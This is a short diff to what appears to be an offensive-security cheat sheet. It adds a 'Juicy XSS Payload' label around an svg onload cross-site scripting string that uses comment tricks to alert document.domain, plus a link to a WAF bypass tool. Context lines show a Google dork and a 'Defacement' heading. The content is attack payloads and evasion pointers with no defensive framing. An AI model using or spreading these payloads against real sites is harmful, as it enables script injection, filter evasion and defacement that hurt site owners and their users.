@@ -3,7 +3,11 @@ Google Dork:
 ===========
 site:*.google.com -inurl:/
 
+Juicy XSS Payload:
+-------------------
 <!--><svg onload=alert(1)-->.asp<svg onload=alert(document.domain)>
+
+XD :) WAF Bypass Tool: https://github.com/khalilbijjou/WAFNinja
 
 Defacement:
 ==========
